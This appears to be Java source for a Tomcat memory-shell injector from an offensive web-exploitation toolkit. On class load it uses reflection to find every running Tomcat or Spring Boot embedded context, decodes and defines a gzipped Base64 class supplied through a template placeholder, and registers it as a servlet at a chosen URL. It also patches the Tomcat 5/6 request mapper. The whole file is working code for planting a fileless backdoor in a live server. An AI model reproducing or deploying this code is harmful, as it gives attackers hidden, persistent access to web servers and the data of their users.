package com.reajason.javaweb.memsell.tomcat.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/15
 */
public class TomcatServletInjector {
    static {
        new TomcatServletInjector();
    }

    public TomcatServletInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object servlet = getServlet(context);
                if (servlet == null) {
                    continue;
                }
                addServlet(context, servlet);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("all")
    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    static Object getFV(Object obj, String fieldName) throws Exception {
        try {
            Field field = getF(obj, fieldName);
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception e) {
            return null;
        }
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = getF(obj, fieldName);
        field.set(obj, value);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    @SuppressWarnings("all")
    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        Object context = null;
        try {
            for (Thread thread : threads) {
                // 适配 v5/v6/7/8
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    // 原: map.get("localhost")
                    // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
                    for (Object key : childrenMap.keySet()) {
                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
                        // 原: context = children.get("");
                        // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
                        for (Object key1 : children.keySet()) {
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }
                            // 兼容 spring boot 2.x embedded tomcat
                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                }
                // 适配 tomcat v9
                else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }
                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return contexts;
    }

    private Object getServlet(Object context) {
        Object servlet = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            servlet = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                servlet = clazz.newInstance();
            } catch (Throwable ee) {
                ee.printStackTrace();
            }
        }
        return servlet;
    }

    @SuppressWarnings("all")
    public void addServlet(Object context, Object servlet) throws Exception {
        if (isInjected(context)) {
            System.out.println("servlet already injected");
            return;
        }
        try {
            Class<?> containerClass = null;
            try {
                containerClass = Class.forName("org.apache.catalina.Container");
            } catch (ClassNotFoundException var12) {
                containerClass = Class.forName("org.apache.catalina.Container", true, context.getClass().getClassLoader());
            }

            Object wrapper = invokeMethod(context, "createWrapper");
            invokeMethod(wrapper, "setName", new Class[]{String.class}, new Object[]{getClassName()});
            invokeMethod(wrapper, "setLoadOnStartup", new Class[]{Integer.TYPE}, new Object[]{1});
            setFieldValue(wrapper, "instance", servlet);
            invokeMethod(wrapper, "setServletClass", new Class[]{String.class}, new Object[]{this.getClassName()});
            invokeMethod(context, "addChild", new Class[]{containerClass}, new Object[]{wrapper});

            try {
                invokeMethod(context, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{getUrlPattern(), getClassName()});
            } catch (NoSuchMethodException var11) {
                invokeMethod(context, "addServletMappingDecoded", new Class[]{String.class, String.class, Boolean.TYPE}, new Object[]{getUrlPattern(), getClassName(), false});
            }
            support56Inject(context, wrapper);
            System.out.println("servlet inject success");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("all")
    public boolean isInjected(Object context) throws Exception {
        Map<String, String> servletMappings = (Map<String, String>) getFV(context, "servletMappings");
        Collection<String> values = servletMappings.values();
        for (String name : values) {
            System.out.println(name);
            if (name.equals(getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void support56Inject(Object context, Object wrapper) throws Exception {
        Class<?> serverInfo = Class.forName("org.apache.catalina.util.ServerInfo", false, context.getClass().getClassLoader());
        String number = (String) invokeMethod(serverInfo, "getServerNumber");
        if (!number.startsWith("5") && !number.startsWith("6")) {
            return;
        }
        Object connectors = getFV(getFV(getFV(getFV(context, "parent"), "parent"), "service"), "connectors");
        int connectorsLength = Array.getLength(connectors);
        for (int i = 0; i < connectorsLength; ++i) {
            Object connector = Array.get(connectors, i);
            String protocolHandlerClassName = (String) getFV(connector, "protocolHandlerClassName");
            if (!protocolHandlerClassName.contains("Http")) {
                continue;
            }
            Object contexts = getFV(getFV(Array.get(getFV(getFV(connector, "mapper"), "hosts"), 0), "contextList"), "contexts");
            int contextsLength = Array.getLength(contexts);
            for (int j = 0; j < contextsLength; ++j) {
                Object o = Array.get(contexts, j);
                if (getFV(o, "object") != context) {
                    continue;
                }
                Class<?> mapperClazz = Class.forName("org.apache.tomcat.util.http.mapper.Mapper", false, context.getClass().getClassLoader());
                Class<?> wrapperClazz = Class.forName("org.apache.tomcat.util.http.mapper.Mapper$Wrapper", false, context.getClass().getClassLoader());
                Constructor<?> declaredConstructor = wrapperClazz.getDeclaredConstructors()[0];
                declaredConstructor.setAccessible(true);
                Object newWrapper = declaredConstructor.newInstance();
                setFieldValue(newWrapper, "object", wrapper);
                setFieldValue(newWrapper, "jspWildCard", false);
                setFieldValue(newWrapper, "name", getUrlPattern());

                Object exactWrappers = getFV(o, "exactWrappers");
                int length = Array.getLength(exactWrappers);
                Object newWrappers = Array.newInstance(wrapperClazz, length + 1);
                Class<?> mapElementClass = Class.forName("org.apache.tomcat.util.http.mapper.Mapper$MapElement", false, context.getClass().getClassLoader());
                Class<?> mapElementArrayClass = Array.newInstance(mapElementClass, 0).getClass();
                invokeMethod(mapperClazz, "insertMap", new Class[]{mapElementArrayClass, mapElementArrayClass, mapElementClass}, new Object[]{exactWrappers, newWrappers, newWrapper});
                setFieldValue(o, "exactWrappers", newWrappers);
            }
        }
    }
}
